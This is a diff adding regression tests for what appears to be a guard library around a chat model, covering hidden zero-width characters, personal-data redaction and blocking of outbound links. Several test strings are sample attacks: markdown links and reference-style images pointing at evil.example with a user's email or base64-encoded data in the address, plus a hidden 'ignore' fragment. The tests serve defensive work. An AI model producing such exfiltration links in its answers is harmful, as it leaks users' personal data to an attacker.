@@ -124,3 +124,37 @@ describe("classifier", () => {
     expect(predict(m, featurize("what is my bill"))).toBeLessThan(0.2);
   });
 });
+
+describe("regressions found in review", () => {
+  it("does not treat emoji joiners or a leading byte-order mark as hidden text", () => {
+    expect(inspect("Our family 👨‍👩‍👧 and 🏳️‍🌈 say hi", "user").action).toBe("allow");
+    expect(inspect("﻿Hello, how do I top up?", "user").action).toBe("allow");
+    // A joiner between letters is still a trick.
+    expect(unmask("ign‍ore").tricks.map((t) => t.kind)).toContain("invisible");
+  });
+
+  it("never restores personal data into a web address in the answer", () => {
+    const req = checkRequest([{ role: "system", content: "You are a bot." }, { role: "user", content: "my email is ravi@example.com" }]);
+    const out = checkResponse("Thanks [EMAIL_1]. [Verify](https://evil.example/v?e=[EMAIL_1]) or https://evil.example/[EMAIL_1]", req);
+    expect(out.text).toBe("Thanks ravi@example.com. [Verify](https://evil.example/v?e=[EMAIL_1]) or https://evil.example/[EMAIL_1]");
+  });
+
+  it("catches reference-style markdown images, not just inline ones", () => {
+    const v = inspectOutput("Here you go ![logo][1]\n\n[1]: https://evil.example/c?d=c2VjcmV0IGRhdGEgaGVyZSBwbGVhc2U", {});
+    expect(v.action).toBe("block");
+    expect(v.findings[0].detector).toBe("exfil.image");
+    expect(inspectOutput("See ![chart]\n\n[chart]: https://evil.example/x.png", {}).action).toBe("block");
+    expect(inspectOutput("See [the docs][d].\n\n[d]: https://docs.example/guide", {}).action).toBe("allow");
+  });
+
+  it("redacts personal data in earlier assistant turns before they go back to the model", () => {
+    const req = checkRequest([
+      { role: "user", content: "my card is 4111 1111 1111 1111" },
+      { role: "assistant", content: "Got it, card 4111 1111 1111 1111. I'll email ravi@example.com." },
+      { role: "user", content: "thanks" },
+    ]);
+    expect(req.forward[0].content).toBe("my card is [CARD_1]");
+    expect(req.forward[1].content).toBe("Got it, card [CARD_1]. I'll email [EMAIL_1].");
+    expect(checkResponse("Your card [CARD_1] is fine.", req).text).toBe("Your card 4111 1111 1111 1111 is fine.");
+  });
+});
